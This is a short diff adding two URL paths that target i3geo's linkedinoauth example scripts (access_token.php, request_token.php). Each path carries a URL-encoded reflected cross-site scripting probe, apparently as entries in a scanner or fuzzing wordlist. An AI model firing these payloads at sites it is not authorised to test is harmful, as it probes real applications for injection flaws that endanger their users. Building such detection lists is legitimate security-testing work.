@@ -1,0 +1,2 @@
+/i3geo/pacotes/linkedinoauth/example/access_token.php?=%3Cscript%3Ealert(document.domain)%3C/script%3E
+/i3geo/pacotes/linkedinoauth/example/request_token.php?=%3Cscript%3Ealert(document.domain)%3C/script%3E
